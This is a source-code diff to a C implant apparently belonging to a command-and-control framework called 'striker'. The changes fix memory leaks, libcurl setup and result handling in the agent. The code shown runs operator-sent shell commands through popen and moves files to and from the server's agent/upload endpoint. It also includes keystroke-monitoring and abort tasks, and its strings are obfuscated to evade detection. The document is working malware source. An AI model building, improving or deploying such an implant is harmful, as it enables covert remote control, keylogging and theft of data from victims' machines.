@@ -136,6 +136,7 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
   curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
   res = curl_easy_perform(curl);
+  curl_easy_cleanup(curl);
   if (res != CURLE_OK){
     buffer_strcpy(result_buff, curl_easy_strerror(res));
     return 0;
@@ -213,14 +214,15 @@ task *parse_task(cJSON *json){
   t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
   t->queued = 0;
   t->completed = 0;
-  t->result = NULL;
+  // t->result = NULL;
+  t->result = cJSON_CreateObject();
   t->input_json = json;
   return t;
 }
 
 void free_task(task *tsk){
   
-  cJSON_Delete(tsk->data);
+  // cJSON_Delete(tsk->data);
   cJSON_Delete(tsk->input_json);
   // free(tsk->uid);
   // free(tsk->type);
@@ -234,7 +236,6 @@ void execute_task(session *striker, task *tsk){
     printf(obfs_decode(msg), tsk->uid);
   }
   cJSON *data = tsk->data;
-  cJSON *result = cJSON_CreateObject();
   buffer *result_buff = create_buffer(0);
   char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort"};
   for (int i = 0; i < 6; i++)
@@ -249,10 +250,9 @@ void execute_task(session *striker, task *tsk){
     char *shell_cmd = malloc(sizeof(char) * 1024);
     snprintf(shell_cmd, sizeof(char) * 1024, strs[1], cmd);
     FILE *proc = popen(shell_cmd, "r");
-    if (!proc){
-      free(shell_cmd);
+    free(shell_cmd);
+    if (!proc)
       goto complete;
-    }
     const short chunk_size = 1024;
     char *tmp = malloc(sizeof(char) * chunk_size);
     while (result_buff->used < MAX_RES_SIZE){
@@ -260,6 +260,7 @@ void execute_task(session *striker, task *tsk){
         break;
       append_buffer(result_buff, tmp, strlen(tmp));
     }
+    free(tmp);
     pclose(proc);
   }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
     char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s"};
@@ -324,19 +325,17 @@ void execute_task(session *striker, task *tsk){
     buffer_strcpy(result_buff, obfs_decode(msg));
   }
 
-  char strs[][40] = {"[OBFS_ENC][+] Task completed: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]result"};
-
-  complete:
+  complete: ; // empty statement to appease GCC
+    char strs[][40] = {"[OBFS_ENC][+] Task completed: %s\n", "[OBFS_ENC]uid", "[OBFS_ENC]result"};
     for (int i = 0; i < 3; i++)
       obfs_decode(strs[i]);
     if (!tsk->queued){    
       if (STRIKER_DEBUG)
         printf(strs[0], tsk->uid);    
       char *res = buffer_to_string(result_buff);
-      cJSON_AddItemToObject(result, strs[1], cJSON_CreateString(tsk->uid));
-      cJSON_AddItemToObject(result, strs[2], cJSON_CreateString(res));
+      cJSON_AddItemToObject(tsk->result, strs[1], cJSON_CreateString(tsk->uid));
+      cJSON_AddItemToObject(tsk->result, strs[2], cJSON_CreateString(res));
       free(res);
-      tsk->result = result;
       tsk->completed = 1;
     }
     free_buffer(result_buff);
@@ -481,8 +480,9 @@ void start_session(){
       queue_seek(completed_tasks, 0);
       while (!queue_exhausted(completed_tasks)){
         task *tsk = queue_get(completed_tasks);
-        free_task(tsk);
+        // cJSON_DetachItemFromArray(results, completed_tasks->pos - 1);
         queue_remove(completed_tasks, completed_tasks->pos - 1);
+        free_task(tsk);
       }
       cJSON_Delete(results);
       free(result);
@@ -517,6 +517,8 @@ void cleanup_session(session *striker){
 
 int main(int argc, char **argv){
   
+  curl_global_init(CURL_GLOBAL_ALL);
   start_session();
+  curl_global_cleanup();
   return 0;  
 }
